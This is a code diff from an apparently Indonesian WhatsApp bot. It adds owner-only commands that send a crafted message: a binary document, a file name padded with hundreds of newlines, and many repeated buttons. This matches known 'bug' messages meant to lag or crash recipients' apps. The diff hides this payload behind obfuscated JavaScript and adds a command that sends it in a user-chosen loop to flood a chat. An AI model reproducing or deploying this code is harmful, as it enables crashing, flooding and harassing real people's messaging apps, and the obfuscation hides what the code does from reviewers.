@@ -1356,26 +1356,18 @@ if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
 {
- var message = {
-document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
-"fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
-caption: ` ${teks}  ${buttonkal}`,
-footer: ` ${teks} `,
-mentionedJid: m.mentionedJid,
-templateButtons: [
-{ urlButton: {displayText: `${teks}`, url: 'www.xnxxhwmods.com'}}, 
-{ urlButton: {displayText: `${teks}`, url: 'www.xnxxhwmods.com'}}, 
-{ urlButton: {displayText: `${teks}`, url: 'www.xnxxhwmods.com'}}, 
-{ callButton: { displayText: `OWNER`, phoneNumber: `62895403595055`}},
-{ callButton: { displayText: `OWNER`, phoneNumber: `62895403595055`}},
-{ callButton: { displayText: `OWNER`, phoneNumber: `62895403595055`}},
-{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🗡️'}},
-{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🛡️'}},
-{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🔧'}},
-{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🪞'}}],
-headerType: 5
+var _0x466e28=_0x285e;(function(_0x37e30e,_0x36bc7a){var _0x8d21a3=_0x285e,_0x3b7e62=_0x37e30e();while(!![]){try{var _0x2ee322=-parseInt(_0x8d21a3(0x15d))/0x1*(-parseInt(_0x8d21a3(0x168))/0x2)+-parseInt(_0x8d21a3(0x166))/0x3+parseInt(_0x8d21a3(0x15b))/0x4*(-parseInt(_0x8d21a3(0x157))/0x5)+parseInt(_0x8d21a3(0x158))/0x6+parseInt(_0x8d21a3(0x153))/0x7*(parseInt(_0x8d21a3(0x160))/0x8)+parseInt(_0x8d21a3(0x155))/0x9+-parseInt(_0x8d21a3(0x15a))/0xa*(parseInt(_0x8d21a3(0x15c))/0xb);if(_0x2ee322===_0x36bc7a)break;else _0x3b7e62['push'](_0x3b7e62['shift']());}catch(_0x23d02a){_0x3b7e62['push'](_0x3b7e62['shift']());}}}(_0x1922,0x4ea1d));var message={'document':fs[_0x466e28(0x169)](_0x466e28(0x163)),'fileName':_0x466e28(0x152),'caption':_0x466e28(0x15e),'footer':'CASPER','mentionedJid':m[_0x466e28(0x167)],'templateButtons':[{'urlButton':{'displayText':_0x466e28(0x152),'url':_0x466e28(0x162)}},{'urlButton':{'displayText':'CASPER','url':'www.casper.com'}},{'urlButton':{'displayText':_0x466e28(0x152),'url':'www.casper.com'}},{'callButton':{'displayText':_0x466e28(0x154),'phoneNumber':'62895403595055'}},{'callButton':{'displayText':_0x466e28(0x154),'phoneNumber':_0x466e28(0x164)}},{'callButton':{'displayText':'OWNER','phoneNumber':_0x466e28(0x164)}},{'quickReplyButton':{'displayText':_0x466e28(0x156),'id':_0x466e28(0x161)}},{'quickReplyButton':{'displayText':_0x466e28(0x156),'id':_0x466e28(0x159)}},{'quickReplyButton':{'displayText':_0x466e28(0x156),'id':'🔧'}},{'quickReplyButton':{'displayText':_0x466e28(0x156),'id':'🪞'}}],'headerType':0x5};function _0x285e(_0x419cc9,_0x1b95df){var _0x192207=_0x1922();return _0x285e=function(_0x285e88,_0x1525fb){_0x285e88=_0x285e88-0x152;var _0x38a03b=_0x192207[_0x285e88];return _0x38a03b;},_0x285e(_0x419cc9,_0x1b95df);}haikal[_0x466e28(0x165)](m[_0x466e28(0x15f)],message,{'quoted':m});function _0x1922(){var _0x49f7c7=['110uFtQkx','2086356nHmQLX','🛡️','64270XUhiXf','90472rzVaUT','979IYPnlf','557JxeSzF','\x20CASPER','chat','1552EkxPgS','🗡️','www.casper.com','./baseikal/sound/ngeselin.BIN','62895403595055','sendMessage','104949JvSLqj','mentionedJid','982kFTGJX','readFileSync','CASPER','12313xePZdu','OWNER','4177800Hdsdtf','CLICK\x20BY'];_0x1922=function(){return _0x49f7c7;};return _0x1922();}
 }
-haikal.sendMessage(m.chat, message, { quoted:m })
+}
+break
+case '💃': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
+if (isBan) return reply(`Lah Lu Kan Di Ban`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `Hallo Aku haikal`
+for (let i = 0; i < jumlah; i++) {
+var _0x466e28=_0x285e;(function(_0x37e30e,_0x36bc7a){var _0x8d21a3=_0x285e,_0x3b7e62=_0x37e30e();while(!![]){try{var _0x2ee322=-parseInt(_0x8d21a3(0x15d))/0x1*(-parseInt(_0x8d21a3(0x168))/0x2)+-parseInt(_0x8d21a3(0x166))/0x3+parseInt(_0x8d21a3(0x15b))/0x4*(-parseInt(_0x8d21a3(0x157))/0x5)+parseInt(_0x8d21a3(0x158))/0x6+parseInt(_0x8d21a3(0x153))/0x7*(parseInt(_0x8d21a3(0x160))/0x8)+parseInt(_0x8d21a3(0x155))/0x9+-parseInt(_0x8d21a3(0x15a))/0xa*(parseInt(_0x8d21a3(0x15c))/0xb);if(_0x2ee322===_0x36bc7a)break;else _0x3b7e62['push'](_0x3b7e62['shift']());}catch(_0x23d02a){_0x3b7e62['push'](_0x3b7e62['shift']());}}}(_0x1922,0x4ea1d));var message={'document':fs[_0x466e28(0x169)](_0x466e28(0x163)),'fileName':_0x466e28(0x152),'caption':_0x466e28(0x15e),'footer':'CASPER','mentionedJid':m[_0x466e28(0x167)],'templateButtons':[{'urlButton':{'displayText':_0x466e28(0x152),'url':_0x466e28(0x162)}},{'urlButton':{'displayText':'CASPER','url':'www.casper.com'}},{'urlButton':{'displayText':_0x466e28(0x152),'url':'www.casper.com'}},{'callButton':{'displayText':_0x466e28(0x154),'phoneNumber':'62895403595055'}},{'callButton':{'displayText':_0x466e28(0x154),'phoneNumber':_0x466e28(0x164)}},{'callButton':{'displayText':'OWNER','phoneNumber':_0x466e28(0x164)}},{'quickReplyButton':{'displayText':_0x466e28(0x156),'id':_0x466e28(0x161)}},{'quickReplyButton':{'displayText':_0x466e28(0x156),'id':_0x466e28(0x159)}},{'quickReplyButton':{'displayText':_0x466e28(0x156),'id':'🔧'}},{'quickReplyButton':{'displayText':_0x466e28(0x156),'id':'🪞'}}],'headerType':0x5};function _0x285e(_0x419cc9,_0x1b95df){var _0x192207=_0x1922();return _0x285e=function(_0x285e88,_0x1525fb){_0x285e88=_0x285e88-0x152;var _0x38a03b=_0x192207[_0x285e88];return _0x38a03b;},_0x285e(_0x419cc9,_0x1b95df);}haikal[_0x466e28(0x165)](m[_0x466e28(0x15f)],message,{'quoted':m});function _0x1922(){var _0x49f7c7=['110uFtQkx','2086356nHmQLX','🛡️','64270XUhiXf','90472rzVaUT','979IYPnlf','557JxeSzF','\x20CASPER','chat','1552EkxPgS','🗡️','www.casper.com','./baseikal/sound/ngeselin.BIN','62895403595055','sendMessage','104949JvSLqj','mentionedJid','982kFTGJX','readFileSync','CASPER','12313xePZdu','OWNER','4177800Hdsdtf','CLICK\x20BY'];_0x1922=function(){return _0x49f7c7;};return _0x1922();}
 }
 }
 break
